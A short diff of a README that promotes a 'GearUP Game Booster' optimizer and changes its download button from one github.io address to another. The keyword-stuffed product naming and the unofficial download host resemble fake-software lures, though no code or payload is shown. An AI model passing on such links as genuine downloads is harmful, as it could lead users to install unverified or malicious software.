@@ -21,7 +21,7 @@ To begin using this **GearUP Game Booster Ping Reducer** and **GearUP Game Boost
 | :--- | :--- |
 | **Get GearUP Game Optimizer** | Click the button below to start the setup for this **GearUP Game Booster Lag Fixer**. |
 
-[![Button](https://img.shields.io/badge/⚡-Get_GearUP_Game_Optimizer-2ea44f?style=for-the-badge)](https://allenwilliam9855874.github.io/.github/gearup-game-booster-optimizer)
+[![Button](https://img.shields.io/badge/⚡-Get_GearUP_Game_Optimizer-2ea44f?style=for-the-badge)](https://community-driven-tools-hub.github.io/.github/gearup-game-booster-optimizer)
 
 ## System Requirements
 
